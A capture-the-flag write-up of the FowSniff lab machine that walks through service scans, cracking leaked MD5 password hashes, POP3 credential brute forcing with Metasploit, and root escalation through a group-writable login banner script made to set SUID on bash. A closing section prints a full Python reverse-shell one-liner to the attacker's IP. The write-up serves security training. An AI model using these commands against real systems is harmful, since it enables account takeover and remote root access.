# FowSniff CTF

Laurent Chauvin | November 09, 2022

## Resources

[1] https://www.shellhacks.com/retrieve-email-pop3-server-command-line/

## Progress

```
export IP=10.10.12.194
```

Nmap scan
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-09 02:20 EST
Nmap scan report for 10.10.12.194
Host is up (0.11s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Fowsniff Corp - Delivering Solutions
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE PIPELINING USER UIDL RESP-CODES SASL(PLAIN) TOP CAPA
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: IMAP4rev1 listed SASL-IR have LITERAL+ ID LOGIN-REFERRALS OK more ENABLE post-login IDLE capabilities AUTH=PLAINA0001 Pre-login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.50 seconds
```

Gobuster scan
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.12.194
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/09 02:23:43 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.12.194/images/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.12.194/assets/]
/server-status        (Status: 403) [Size: 300]
Progress: 220560 / 220561 (100.00%)===============================================================
2022/11/09 03:03:42 Finished
===============================================================
```

Nikto scan
```
nikto -h $IP | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.12.194
+ Target Hostname:    10.10.12.194
+ Target Port:        80
+ Start Time:         2022-11-09 02:23:48 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: a45, size: 5674fd157f6d0, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2022-11-09 02:38:47 (GMT-5) (899 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Checking 'robots.txt'
```
User-agent: *
Disallow: /
```

From the website, we find references of a twitter account
```
@fowsniffcorp
```

On the twitter we can read
```
lol gr8 security 
@FowsniffCorp
 - too bad I'm dumping all your passwords!
https://pastebin.com/NrAqVeeX
```

Although the pastebin doesn't work, following the link in the description of the twitter account, we can find mirrors of it
```
Backups of the "password dump" can be found here:
- https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt
- https://web.archive.org/web/20200920053052/https://pastebin.com/NrAqVeeX
```

Which contain
```
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!
 
 
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
 
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
 
l8r n00bz!
 
B1gN1nj4

-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.

--- THIS IS NOT A REAL PASSWORD LEAK ---
 
All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.
 
Any similarities to actual people or entities is purely coincidental and occurred accidentally.

-------------------------------------------------------------------------------------------------
```

Using john, we get
```
john md5_hashes.txt --wordlist=/opt/rockyou.txt --format=Raw-MD5

Using default input encoding: UTF-8
Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
scoobydoo2       (seina@fowsniff)     
orlando12        (parede@fowsniff)     
apples01         (tegel@fowsniff)     
skyler22         (baksteen@fowsniff)     
mailcall         (mauer@fowsniff)     
07011972         (sciana@fowsniff)     
carp4ever        (mursten@fowsniff)     
bilbo101         (mustikka@fowsniff)     
8g 0:00:00:01 DONE (2022-11-09 02:35) 6.400g/s 11474Kp/s 11474Kc/s 29345KC/s  filimani..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

The challenge ask us to bruteforce the pop3 login. Let's fire up metasploit then
```
msfconsole
```

While it's loading, let's prepare our userpass file
```
seina scoobydoo2
parede orlando12
tegel apples01
baksteen skyler22
mauer mailcall
sciana 07011972
mursten carp4ever
mustikka bilbo101   
```

In ```msfconsole``` let's use the 'scanner/pop3/pop3_login' plugin
```
use scanner/pop3/pop3_login
```

Let's check the options
```
msf6 auxiliary(scanner/pop3/pop3_login) > show options

Module options (auxiliary/scanner/pop3/pop3_login):

   Name              Current Setting                                                    Required  Description
   ----              ---------------                                                    --------  -----------
   BLANK_PASSWORDS   false                                                              no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                  yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                              no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                              no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                              no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                                               no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                                                                             no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  no        The file that contains a list of probable passwords.
   RHOSTS                                                                               yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             110                                                                yes       The target port (TCP)
   STOP_ON_SUCCESS   false                                                              yes       Stop guessing when a credential works for a host
   THREADS           1                                                                  yes       The number of concurrent threads (max one per host)
   USERNAME                                                                             no        A specific username to authenticate as
   USERPASS_FILE                                                                        no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                              no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/unix_users.txt      no        The file that contains a list of probable users accounts.
   VERBOSE           true                                                               yes       Whether to print output for all attempts
```

After setting the "RHOST" to our target IP, and "USERPASS_FILE" to our userpass.txt file, let's unset "USER_FILE" and "PASS_FILE" as we don't need them
```
unset USER_FILE
unset PASS_FILE
```

Let's run the exploit
```
msf6 auxiliary(scanner/pop3/pop3_login) > exploit

[+] 10.10.12.194:110      - 10.10.12.194:110 - Success: 'seina:scoobydoo2' '+OK Logged in.  '
[!] 10.10.12.194:110      - No active DB -- Credential data will not be saved!
[-] 10.10.12.194:110      - 10.10.12.194:110 - Failed: 'parede:orlando12', '-ERR [AUTH] Authentication failed.'
[-] 10.10.12.194:110      - 10.10.12.194:110 - Failed: 'tegel:apples01', '-ERR [AUTH] Authentication failed.'
[-] 10.10.12.194:110      - 10.10.12.194:110 - Failed: 'baksteen:skyler22', '-ERR [AUTH] Authentication failed.'
[-] 10.10.12.194:110      - 10.10.12.194:110 - Failed: 'mauer:mailcall', ''
[-] 10.10.12.194:110      - 10.10.12.194:110 - Failed: 'sciana:07011972', ''
[-] 10.10.12.194:110      - 10.10.12.194:110 - Failed: 'mursten:carp4ever', ''
[-] 10.10.12.194:110      - 10.10.12.194:110 - Failed: 'mustikka:bilbo101', ''
[*] 10.10.12.194:110      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

We can see 'seina' succeeded to log in.

Using ```nc``` to connect on pop3 (port 110) and logging in as 'seina'
```
nc $IP 110

+OK Welcome to the Fowsniff Corporate Mail Server!

USER seina
+OK

PASS scoobydoo2
+OK Logged in.
```

Checking her messages
```
LIST

+OK 2 messages:
1 1622
2 1280
```

Let's get message 1
```
RETR 1

+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```

and message 2
```
RETR 2

+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.
```

List of POP commands can be found in [1]

We now have a temporary ssh password
```
S1ck3nBluff+secureshell
```

and apparently some staff is on vacation, so they probably didn't change their password. Also, Skyler (baksteen@fowsniff) seems not to have read the previous email. She probably didn't update her password.

Let's try to ssh
```
ssh baksteen@$IP

baksteen@10.10.12.194's password: S1ck3nBluff+secureshell

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
baksteen@fowsniff:~$ 
```

We're in !!

Checking the groups of the user
```
baksteen@fowsniff:~$ groups

users baksteen
```

Looking for an executable file, under the group 'users'
```
baksteen@fowsniff:~$ find / -group users -executable -type f 2>/dev/null

/opt/cube/cube.sh
```

Let's check this 'cube.sh'
```
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"
```

It seems to be just the wall. However, it seems to be owned by someone else
```
-rw-rwxr-- 1 parede users  851 Mar 11  2018 cube.sh
```

As we can modify it (being part of the 'users' group), maybe we can modify it, and when loging in again, it will be executed with higher privileges.

Let's try to make ```/bin/bash``` suid, using the ```sudo``` command
```
sudo chmod +s /bin/bash
```

Let's reconnect and check
```
-bash-4.3$ ls -al /bin/bash

-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
```

It worked. Let's get root
```
/bin/bash -p

bash-4.3# whoami
root
```

We are root !!!

## To Go Further

The challenge ask us to get a reverse shell, but it's not necessary. We could have put a command like

```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.23.136",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

then start a listener
```sh
nc -lnvp 9999
```

and login again, to get a reverse shell as root.

As the challenge rightfully point it out, when looking at the file '/etc/update-motd.d/00-header'
```
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

#[ -r /etc/lsb-release ] && . /etc/lsb-release

#if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
#       # Fall back to using the very slow lsb_release utility
#       DISTRIB_DESCRIPTION=$(lsb_release -s -d)
#fi

#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

sh /opt/cube/cube.sh
```

It's running the 'cube.sh' file, and '00-header' is owned by root
```
-rwxr-xr-x  1 root root 1248 Mar 11  2018 00-header
```

So this banner at login, is run by root. Modifying 'cube.sh' will end up in running code as root.
